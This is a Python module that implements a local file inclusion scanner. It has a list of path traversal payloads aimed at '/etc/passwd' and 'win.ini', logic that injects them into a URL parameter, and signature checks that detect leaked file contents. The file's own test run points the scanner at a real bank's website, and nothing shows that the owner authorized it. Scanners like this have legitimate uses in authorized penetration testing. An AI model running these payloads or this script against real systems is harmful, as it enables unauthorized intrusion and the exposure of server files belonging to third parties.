# xss_security_gui/lfi_tester.py

import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Optional

from xss_security_gui.settings import settings


# -----------------------------------------
# LFI payloads (можна розширювати в settings)
# -----------------------------------------
DEFAULT_LFI_PAYLOADS: List[str] = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..\\..\\windows\\win.ini",
    "/etc/passwd",
    "..%252f..%252fetc%252fpasswd",
]


# -----------------------------------------
# Вспомогательные функции
# -----------------------------------------
def build_lfi_url(base_url: str, param: str, payload: str) -> Optional[str]:
    """
    Формує URL з підміненою змінною параметра.
    Повертає None, якщо параметра немає в URL.
    """
    parsed = urlparse(base_url)
    query = parse_qs(parsed.query, keep_blank_values=True)

    if param not in query:
        return None

    query[param] = [payload]
    new_query = urlencode(query, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


def is_suspicious_content(text: str) -> bool:
    """
    Перевіряє, чи містить відповідь сигнатури LFI.
    """
    text = text.lower()

    signatures = getattr(settings, "LFI_SIGNATURES", None) or [
        "root:x",          # /etc/passwd
        "[extensions]",    # win.ini
        "[fonts]",
        "[drivers]",
    ]

    return any(sig in text for sig in signatures)


# -----------------------------------------
# Основний LFI‑тестер
# -----------------------------------------
def test_lfi_payloads(
    base_url: str,
    param: str = "file",
    payloads: Optional[List[str]] = None,
    delay: Optional[float] = None,
    timeout: Optional[int] = None
) -> List[Dict[str, Any]]:
    """
    Перевіряє LFI уразливість шляхом підстановки payload'ів.
    Повертає список результатів у форматі:
    {
        "url": str,
        "payload": str,
        "status": int | "ERR",
        "length": int,
        "suspicious": bool,
        "error": Optional[str]
    }
    """

    if not base_url or not param:
        raise ValueError("URL і параметр повинні бути вказані")

    # Безпечне отримання payload-ів
    payloads = (
        payloads
        or getattr(settings, "LFI_PAYLOADS", None)
        or DEFAULT_LFI_PAYLOADS
    )

    # Таймінги
    delay = delay if delay is not None else getattr(settings, "LFI_DELAY", 0.5)
    timeout = timeout if timeout is not None else getattr(settings, "REQUEST_TIMEOUT", 10)

    results: List[Dict[str, Any]] = []

    for payload in payloads:
        full_url = build_lfi_url(base_url, param, payload)
        if not full_url:
            continue

        try:
            resp = requests.get(full_url, timeout=timeout)
            content = resp.text

            suspicious = is_suspicious_content(content)

            results.append({
                "url": full_url,
                "payload": payload,
                "status": resp.status_code,
                "length": len(content),
                "suspicious": suspicious,
            })

        except Exception as e:
            results.append({
                "url": full_url,
                "payload": payload,
                "status": "ERR",
                "length": 0,
                "suspicious": False,
                "error": str(e),
            })

        time.sleep(delay)

    return results


# -----------------------------------------
# Тестовий запуск
# -----------------------------------------
if __name__ == "__main__":
    base = "https://gazprombank.ru/view.php?file=readme.txt"

    test_results = test_lfi_payloads(base, param="file")

    for res in test_results:
        mark = "✅" if res["suspicious"] else "⚠️"
        print(f"{mark} {res['url']} | status={res['status']} | len={res['length']}")
        if "error" in res:
            print(f"   ❌ Error: {res['error']}")